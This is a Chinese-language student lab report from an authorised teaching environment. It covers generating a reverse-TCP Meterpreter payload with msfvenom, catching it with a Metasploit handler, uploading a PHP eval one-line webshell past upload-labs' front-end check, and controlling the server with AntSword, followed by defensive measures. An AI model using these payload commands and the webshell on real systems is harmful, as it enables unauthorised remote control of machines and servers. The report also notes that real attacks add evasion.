---
title: "Msfvenom 木马与 WebShell 控制实验"
category: 作业
description: "Msfvenom 木马生成与检测、WebShell 写入与蚁剑控制测试。"
published: 2026-11-08
tags: [作业，渗透测试，Msfvenom]
---
**`声明：本实验在授权的隔离教学环境中进行,仅用于网络安全教学与安全评估能力培养,严禁对未授权系统实施。`**
**一、实验基本信息**
| 项目 | 内容 |
| -- | -- |
| 实验名称 | Msfvenom 木马生成与检测、WebShell 写入与蚁剑控制 |
| 实验类型 | 渗透测试基础综合实验 |
| 实验环境 | Kali Linux(攻击机)+Windows(受害机)+upload-labs靶场 |
| 靶场目标 | upload-labs Pass01 |

**实验一:Msfvenom 木马生成、微步云沙箱检测与被控端复现**
**1.1 实验目的**

    掌握使用 msfvenom 生成反向 TCP 木马(payload)的方法,理解各核心参数含义。
    学会将生成的木马提交至微步云沙箱(ThreatBook)进行静态/动态检测,并解读检测报告。
    掌握使用 Metasploit 的 exploit/multi/handler 开启监听、接收反弹连接并获取 Meterpreter 会话的完整流程。
    理解反向连接(Reverse TCP)相对正向连接在绕过防火墙方面的原理。

**1.2 实验原理**

    反向 TCP(Reverse TCP):受害机主动向攻击机发起连接,而非攻击机主动连接受害机。由于多数网络环境下出站流量默认放行,而外部主动发起的入站连接常被防火墙拦截,因此反向连接具有更强的穿透能力。
    Meterpreter:Metasploit 提供的高级攻击载荷,运行在内存中,支持文件系统操作、进程迁移、提权、键盘记录等丰富的后渗透功能。
    微步云沙箱:将可疑文件上传至云端隔离环境,通过动态执行与静态分析,识别恶意行为(如建立 C2 连接、写注册表、注入进程等)并输出检测报告。

**1.3 实验步骤**
**1.3-01 生成木马**
在 Kali 攻击机上打开终端,执行如下命令生成 Windows 反向 Meterpreter 木马:
```
msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.xxx.xxx LPORT=4444 -f exe -o payload.exe
```
参数含义详解:
| 参数 | 含义 | 作用 |
| -- | -- | -- |
| -p | payload（载荷） | 指定要生成的攻击载荷类型。本实验使用 windows/x64/meterpreter/reverse_tcp，即 x64版Windows平台的 Meterpreter 反向 TCP 载荷 |
| -f | format（格式） | 指定输出文件的格式。exe 表示生成 Windows 可执行文件（PE 格式） |
| -o | output（输出） | 指定生成文件的输出路径与文件名，此处输出为当前目录下的 payload.exe |
| LHOST | Local Host（本机/攻击机地址） | 木马回连的目标地址，填写 Kali 攻击机 IP|
| LPORT | Local Port（本机/攻击机端口） | 木马回连的目标端口，填写攻击机监听端口 4444 |

![Img](https://cdn.jsdelivr.net/gh/CheerrightNow/my-blog-images@img/img/img/2026/11/12/5cca9592435d998e42f4175923722344-yank-note-picgo-img-20261112103933.png)

生成后可使用``` ls -l payload.exe ```或 ```file payload.exe ```验证文件已生成且为 Windows PE 可执行文件:

![Img](https://cdn.jsdelivr.net/gh/CheerrightNow/my-blog-images@img/img/img/2026/11/12/50a5acae31a5d9a13634dff4e5abe8fb-yank-note-picgo-img-20261112104109.png)

**1.3-02 微步云沙箱上传**
将生成的 payload.exe 通过 SFTP、共享文件夹或 HTTP 等方式传回本机后,打开浏览器访问微步云沙箱:
```https://s.threatbook.com/```
![](https://cdn.jsdelivr.net/gh/CheerrightNow/my-blog-images@img/img/img/2026/11/12/cf75fa356c79ab3af92100389c3e44a4-yank-note-picgo-img-20261112111820.png)

**1.3-03 启动主控端(Metasploit 监听)**
```
msfconsole

进入 msf6 > 提示符后,执行:
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST 192.168.2.123
set LPORT 4444
set ExitOnSession false
exploit
sessions -i 1

```

**命令含义：**
| 命令 | 含义 |
| -- | -- |
| use exploit/multi/handler | 加载多协议通用监听模块，用于接收反弹会话 |
| set payload windows/x64/meterpreter/reverse_tcp | 设置与木马一致的载荷类型，确保协议匹配 |
| set LHOST 192.168.xxx.xxx | 设置监听地址为 Kali 本机 IP |
| set LPORT 4444 | 设置监听端口与木马回连端口一致（4444） |
| set ExitOnSession false | 收到一个会话后不自动退出监听，便于多次回连 |
| exploit（或 run） | 启动监听 |

![Img](https://cdn.jsdelivr.net/gh/CheerrightNow/my-blog-images@img/img/img/2026/11/12/68d47788a51aebc2c23a7e65c1e21272-yank-note-picgo-img-20261112112627.png)

**1.3-04 复现控制**
将 payload.exe 拷贝至 Windows 受害机,双击运行。
运行后,Kali 的 MSF 监听端会立即收到反弹连接,输出如下信息:
![Img](https://cdn.jsdelivr.net/gh/CheerrightNow/my-blog-images@img/img/img/2026/11/12/3c36642e3ae60f996c463521649ce75a-yank-note-picgo-img-20261112113526.png)

进入 Meterpreter 交互界面(meterpreter >):
```
meterpreter > sysinfo
meterpreter > getuid
meterpreter > ipconfig
meterpreter > show_mount
```
sysinfo 返回受害机操作系统、主机名等信息;getuid 显示当前运行木马的权限(如 NT AUTHORITY\SYSTEM 或当前用户,视实际环境而定);show_mount 查看受害机文件系统挂载情况。
![Img](https://cdn.jsdelivr.net/gh/CheerrightNow/my-blog-images@img/img/img/2026/11/12/51dea55f8fc4ce11cbeede99a816dcc0-yank-note-picgo-img-20261112114213.png)

**1.4 实验分析**
**1.4-01 微步沙箱检测结果分析**

    报毒名称/威胁判定:沙箱将该样本判定为 Trojan、Backdoor 等几类恶意程序,并给出恶意威胁的判定。
    
    结论:静态特征(未加壳的默认 msfvenom 样本)较易被云端沙箱识别,说明基础生成、未经免杀处理的木马在实际防护环境下检出率较高。

**1.4-02 反向连接(Reverse TCP)绕过防火墙原理**

    传统正向连接(Bind TCP)需要攻击机主动连接受害机上的某端口,而该端口极易被受害机防火墙拦截,导致连接失败。
    反向连接中,受害机作为「发起方」主动向攻击机出站连接。多数防火墙默认允许出站流量(尤其是常见的 80、443 及高位端口),因此反向连接更容易穿透防火墙与 NAT。
    同时,攻击机仅需保持一个对外监听端口,受害机无需对外开放端口,降低了暴露风险,也简化了攻击链的建立。

**实验二:目标网站一句话木马写入与蚁剑控制**
**2.1 实验目的**

    掌握利用常见 Web 文件上传/解析漏洞写入一句话木马的方法。
    学会使用中国蚁剑(AntSword)配置连接参数、测试并建立 WebShell 连接。
    掌握连接成功后进行文件管理、虚拟终端执行系统命令等后渗透操作。
    理解一句话木马的隐蔽性原理及相应防御策略。

**2.2 实验原理**

    一句话木马(WebShell):指代码极短、功能单一的恶意脚本,通过接收 HTTP 请求中的参数并执行,实现远程控制。PHP 环境下典型形式为 eval 执行外部传入的代码。
    
    蚁剑(AntSword):开源的 WebShell 管理工具,通过 HTTP 请求向一句话木马发送加密/编码后的命令,接收并解析返回结果,实现图形化的文件管理、命令执行、数据库操作等功能。
   
    upload-labs Pass01:该关卡主要通过前端 JavaScript 对上传文件扩展名进行校验,可通过对前端校验的绕过(禁用 JS、抓包改包等)上传任意文件。

**2.3 实验步骤**
**2.3-01 写入木马**
基础的一句话木马代码如下:
```<?php @eval($_POST['cmd']);?>```
将其写入文件```webshell2.php```
**代码说明:** $_POST['cmd'] 获取 HTTP POST 请求中名为 cmd 的参数值,@ 用于抑制错误信息,eval() 将传入的字符串作为 PHP 代码执行。连接密码即为参数名 cmd。
**具体过程**
将webshell2.php后缀改为.jpg，burpsuite抓包时再改回原.php后缀，蚁剑查看成功上传

![屏幕截图 2026-09-22 205133](https://cdn.jsdelivr.net/gh/CheerrightNow/my-blog-images@img/img/img/2026/09/22/9f6e3436280b5ff74c9e7cc086ae0f2d-%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-09-22%20205133.png)

![屏幕截图 2026-09-22 205424](https://cdn.jsdelivr.net/gh/CheerrightNow/my-blog-images@img/img/img/2026/09/22/6aeadcd288575821c511b0f531d6ff05-%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-09-22%20205424.png)

**2.3-02 蚁剑连接**
打开中国蚁剑(AntSword),在「数据列表」空白处右键,选择「添加数据」,在「添加数据」窗口中填写连接信息:
| 配置项 | 填写内容 | 说明 |
| -- | -- | -- |
| 连接类型 | 默认 | 保持默认即可 |
| 编码器 | default（或选择 PHP） | 与目标木马为 PHP 类型匹配 |
| 连接密码 | cmd | 与一句话木马 $_POST['cmd'] 的参数名一致 |
| URL 地址 | http://192.168.xxx.xxx/upload-labs/upload/webshell2.php | (木马文件的完整访问地址)|

填写完成后,点击「测试连接」,若配置正确,会提示「连接成功」。
保存数据后,双击该连接条目,即可展开并进入目标目录,表示连接成功建立。
![屏幕截图 2026-09-22 205223](https://cdn.jsdelivr.net/gh/CheerrightNow/my-blog-images@img/img/img/2026/09/22/cfc5186de5725d010cfe9db23f005706-%E5%B1%8F%E5%B9%95%E6%88%AA%E5%9B%BE%202026-09-22%20205223.png)
**2.3-03 控制目标**
连接成功后,界面左侧「文件管理」区会显示目标服务器的目录结构(如 /var/www/html 等),说明已成功控制目标。

可执行的后续操作:

    文件管理:浏览、上传、下载、编辑、重命名、删除目标服务器上的文件。
    (whoami,pwd,ls -la,id,ip addr......)

**2.4 实验分析**
**2.4-01 一句话木马的隐蔽性原理**

    代码极短:仅十余个字符,无冗长功能代码与明显恶意字符串,可较容易嵌入图片、压缩包或合法文件中,静态字符串匹配特征弱。
    
    无独立文件特征:木马本身不产生新进程,仅在被请求时由 Web 服务进程解释执行,行为上与其他 PHP 脚本难以区分。
    
    通信隐蔽:命令通过普通 HTTP POST 参数传递,流量特征与正常表单提交相似,不易被基于流量特征的检测识别。

**2.4-02  防御此类攻击的核心策略**

    文件上传白名单:仅允许特定类型(如图片扩展名及 MIME 校验),禁止上传可执行脚本扩展名(.php、.jsp、.asp 等),并对文件名做随机化处理。
    
    文件内容检测:不仅校验扩展名,还需校验文件真实内容(文件头、图片重编码等),防止伪装。
    
    禁止危险函数执行:在 PHP 配置(php.ini 的 disable_functions)中禁用 eval、assert、system、exec、shell_exec、passthru 等高危函数。
    
    目录权限与解析隔离:上传目录关闭脚本执行权限(如 Apache 中 php_flag engine off),或将上传目录与 Web 解析目录隔离。
    
    Web 应用防火墙(WAF)与运行时防护:对上传内容、可疑请求参数(如恶意代码片段)进行检测拦截。
    
    最小权限运行:Web 服务以低权限用户运行,限制被控后的危害范围,并定期进行日志审计与文件完整性监控。

三、实验总结

通过本实验,完整实践了从「木马生成 → 沙箱检测 → 监听回连 → Meterpreter 控制」以及「一句话木马写入 → 蚁剑连接 → 远程控制」两条典型攻击链路。实验中深刻认识到:

    未做免杀处理的默认 msfvenom 样本易被云沙箱与杀软识别,实际对抗中需进一步结合编码器、加壳、载荷定制等手段。

    反向 TCP 连接凭借出站连接天然优势,能有效绕过部分防火墙,是渗透测试中的常用连接方式。

    一句话木马以极简代码和原生函数实现隐蔽控制,凸显了 Web 端「文件上传 + 危险函数」组合漏洞的高危害性,同时也验证了白名单校验、禁用危险函数、目录解析隔离等防御措施的必要性。
